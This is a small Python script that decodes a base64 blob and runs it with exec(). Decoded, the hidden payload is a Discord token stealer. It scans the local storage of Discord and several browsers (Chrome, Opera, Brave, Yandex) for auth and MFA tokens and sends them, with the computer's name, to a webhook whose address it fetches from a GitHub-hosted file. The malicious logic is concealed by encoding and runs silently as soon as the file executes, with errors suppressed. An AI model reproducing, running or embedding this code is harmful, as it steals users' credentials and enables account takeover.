import base64
m3h = "aW1wb3J0IG9zCmltcG9ydCBkaXNjb3JkCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgc29ja2V0CmZyb20gcmUgaW1wb3J0IGZpbmRhbGwKZnJvbSBqc29uIGltcG9ydCBsb2Fkcwpmcm9tIGJhc2U2NCBpbXBvcnQgYjY0ZGVjb2RlCmZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IFJlcXVlc3QsIHVybG9wZW4KCndlYmhvb2tfdXJsX3NvdXJjZSA9ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vTWVoZGlLYW1iZXIvbm90aGluZy9yZWZzL2hlYWRzL21haW4vZXhhbXBsZS50eHQiCgpkZWYgZ2V0X3dlYmhvb2tfdXJsKCk6CiAgICB0cnk6CiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQod2ViaG9va191cmxfc291cmNlKQogICAgICAgIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgcmV0dXJuIHJlc3BvbnNlLnRleHQuc3RyaXAoKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHJldHVybiBOb25lCiAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5SZXF1ZXN0RXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcmV0dXJuIE5vbmUKCldFQkhPT0tfVVJMID0gZ2V0X3dlYmhvb2tfdXJsKCkKCkxPQ0FMID0gb3MuZ2V0ZW52KCJMT0NBTEFQUERBVEEiKQpST0FNSU5HID0gb3MuZ2V0ZW52KCJBUFBEQVRBIikKUEFUSFMgPSB7CiAgICAiRGlzY29yZCI6IFJPQU1JTkcgKyAiXFxEaXNjb3JkIiwKICAgICJEaXNjb3JkIENhbmFyeSI6IFJPQU1JTkcgKyAiXFxkaXNjb3JkY2FuYXJ5IiwKICAgICJEaXNjb3JkIFBUQiI6IFJPQU1JTkcgKyAiXFxkaXNjb3JkcHRiIiwKICAgICJHb29nbGUgQ2hyb21lIjogTE9DQUwgKyAiXFxHb29nbGVcXENocm9tZVxcVXNlciBEYXRhXFxEZWZhdWx0IiwKICAgICJPcGVyYSI6IFJPQU1JTkcgKyAiXFxPcGVyYSBTb2Z0d2FyZVxcT3BlcmEgU3RhYmxlIiwKICAgICJPcGVyYSBHWCI6IFJPQU1JTkcgKyAiXFxPcGVyYSBTb2Z0d2FyZVxcT3BlcmEgR1ggU3RhYmxlIiwKICAgICJCcmF2ZSI6IExPQ0FMICsgIlxcQnJhdmVTb2Z0d2FyZVxcQnJhdmUtQnJvd3NlclxcVXNlciBEYXRhXFxEZWZhdWx0IiwKICAgICJZYW5kZXgiOiBMT0NBTCArICJcXFlhbmRleFxcWWFuZGV4QnJvd3NlclxcVXNlciBEYXRhXFxEZWZhdWx0Igp9CgpkZWYgc2VuZF9lbWJlZCh0aXRsZSwgZGVzY3JpcHRpb24sIGNvbG9yPTB4MDBmZjAwKToKICAgIGRhdGEgPSB7CiAgICAgICAgJ2VtYmVkcyc6IFt7CiAgICAgICAgICAgICd0aXRsZSc6IHRpdGxlLAogICAgICAgICAgICAnZGVzY3JpcHRpb24nOiBkZXNjcmlwdGlvbiwKICAgICAgICAgICAgJ2NvbG9yJzogY29sb3IKICAgICAgICB9XQogICAgfQogICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KFdFQkhPT0tfVVJMLCBqc29uPWRhdGEpCiAgICBpZiBub3QgcmVzcG9uc2Uub2s6CiAgICAgICAgcGFzcwoKZGVmIGdldGhlYWRlcnModG9rZW49Tm9uZSwgY29udGVudF90eXBlPSJhcHBsaWNhdGlvbi9qc29uIik6CiAgICBoZWFkZXJzID0gewogICAgICAgICJDb250ZW50LVR5cGUiOiBjb250ZW50X3R5cGUsCiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMTEgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMjMuMC4xMjcxLjY0IFNhZmFyaS81MzcuMTEiCiAgICB9CiAgICBpZiB0b2tlbjoKICAgICAgICBoZWFkZXJzLnVwZGF0ZSh7IkF1dGhvcml6YXRpb24iOiB0b2tlbn0pCiAgICByZXR1cm4gaGVhZGVycwoKZGVmIGdldHVzZXJkYXRhKHRva2VuKToKICAgIHRyeToKICAgICAgICByZXR1cm4gbG9hZHModXJsb3BlbihSZXF1ZXN0KCJodHRwczovL2Rpc2NvcmRhcHAuY29tL2FwaS92Ni91c2Vycy9AbWUiLCBoZWFkZXJzPWdldGhlYWRlcnModG9rZW4pKSkucmVhZCgpLmRlY29kZSgpKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHNlbmRfZW1iZWQoIlRva2VuIE5vdCBGb3VuZCIsIGYiIiwgY29sb3I9MHhmZjAwMDApCiAgICAgICAgcGFzcwoKZGVmIGdldHRva2VucyhwYXRoKToKICAgIHBhdGggKz0gIlxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYiIKICAgIHRva2VucyA9IFtdCiAgICB0cnk6CiAgICAgICAgZm9yIGZpbGVfbmFtZSBpbiBvcy5saXN0ZGlyKHBhdGgpOgogICAgICAgICAgICBpZiBub3QgZmlsZV9uYW1lLmVuZHN3aXRoKCIubG9nIikgYW5kIG5vdCBmaWxlX25hbWUuZW5kc3dpdGgoIi5sZGIiKToKICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgIGZvciBsaW5lIGluIFt4LnN0cmlwKCkgZm9yIHggaW4gb3BlbihmIntwYXRofVxce2ZpbGVfbmFtZX0iLCBlcnJvcnM9Imlnbm9yZSIpLnJlYWRsaW5lcygpIGlmIHguc3RyaXAoKV06CiAgICAgICAgICAgICAgICBmb3IgcmVnZXggaW4gKHIiW0EtWmEtelxkXXsyNn1cLltcdy1dezZ9XC5bXHctXXszOH0iLCByIm1mYVwuW1x3LV17ODR9Iik6CiAgICAgICAgICAgICAgICAgICAgZm9yIHRva2VuIGluIGZpbmRhbGwocmVnZXgsIGxpbmUpOgogICAgICAgICAgICAgICAgICAgICAgICB0b2tlbnMuYXBwZW5kKHRva2VuKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHNlbmRfZW1iZWQoIlRva2VuIE5vdCBGb3VuZCIsIGYiIiwgY29sb3I9MHhmZjAwMDApCiAgICByZXR1cm4gdG9rZW5zCgpkZWYgZ2V0X2NvbXB1dGVyX25hbWUoKToKICAgIGNvbXB1dGVyX25hbWUgPSBzb2NrZXQuZ2V0aG9zdG5hbWUoKQogICAgcmV0dXJuIGNvbXB1dGVyX25hbWUKCmRlZiBnZXRfaXBfYWRkcmVzcygpOgogICAgaG9zdG5hbWUgPSBzb2NrZXQuZ2V0aG9zdG5hbWUoKQogICAgaXBfYWRkcmVzcyA9IHNvY2tldC5nZXRob3N0YnluYW1lKGhvc3RuYW1lKQogICAgcmV0dXJuIGlwX2FkZHJlc3MKCmRlZiBtYWluKCk6CiAgICBjaGVja2VkID0gW10KICAgIAogICAgZm9yIHBsYXRmb3JtLCBwYXRoIGluIFBBVEhTLml0ZW1zKCk6CiAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOgogICAgICAgICAgICBjb250aW51ZQogICAgICAgIGZvciB0b2tlbiBpbiBnZXR0b2tlbnMocGF0aCk6CgogICAgICAgICAgICBpZiB0b2tlbiBpbiBjaGVja2VkOgogICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgY2hlY2tlZC5hcHBlbmQodG9rZW4pCiAgICAgICAgICAgIHBhcnRzID0gdG9rZW4uc3BsaXQoIi4iKQogICAgICAgICAgICBpZiBsZW4ocGFydHMpICE9IDM6CiAgICAgICAgICAgICAgICBjb250aW51ZQoKICAgICAgICAgICAgaWYgdG9rZW4gbm90IGluIGNoZWNrZWQ6CiAgICAgICAgICAgICAgICBzZW5kX2VtYmVkKCJUb2tlbiBOb3QgRm91bmQiLCBmIiIsIGNvbG9yPTB4ZmYwMDAwKQogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgaXAgPSBnZXRfaXBfYWRkcmVzcygpCiAgICAgICAgICAgIHBjX25hbWUgPSBnZXRfY29tcHV0ZXJfbmFtZSgpCiAgICAgICAgICAgIHNlbmRfZW1iZWQoZiIiLCBmImBgYHtwY19uYW1lfWBgYGBgYHt0b2tlbn1gYGAiLCBjb2xvcj0weDAwZmYwMCkKICAgICAgICAgICAgcmV0dXJuCgp0cnk6CiAgICBtYWluKCkKZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgcGFzcyA="
m4h = base64.b64decode(m3h).decode('utf-8')
exec(m4h)
